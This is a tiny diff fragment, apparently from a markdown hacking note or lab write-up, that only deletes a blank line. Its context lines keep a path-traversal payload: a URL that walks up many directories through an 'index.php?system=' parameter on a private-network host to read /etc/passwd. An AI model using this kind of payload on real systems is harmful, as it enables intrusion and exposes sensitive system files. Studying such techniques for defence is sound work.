@@ -23,7 +23,6 @@ if that doesn't work try
 `http://192.168.1.70/index.php?system=../../../../../../../../../../../../../../../../../etc/passwd.html
 
 
-
 ___
 
 ## Resources:
